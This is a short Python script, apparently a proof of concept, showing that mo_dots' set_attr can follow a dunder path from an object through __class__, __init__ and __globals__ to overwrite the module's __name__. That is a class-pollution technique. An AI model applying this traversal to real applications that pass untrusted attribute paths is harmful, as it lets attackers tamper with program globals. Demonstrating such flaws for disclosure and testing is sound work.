from mo_dots import set_attr
from dataclasses import dataclass

@dataclass
class State:
    input: str
    output: str
    textarea_key: int

obj = State('HELLO', 'WORLD', 0)


set_attr(obj, ["__class__", "__init__", "__globals__", "__name__"], 'polluted')
print(__name__)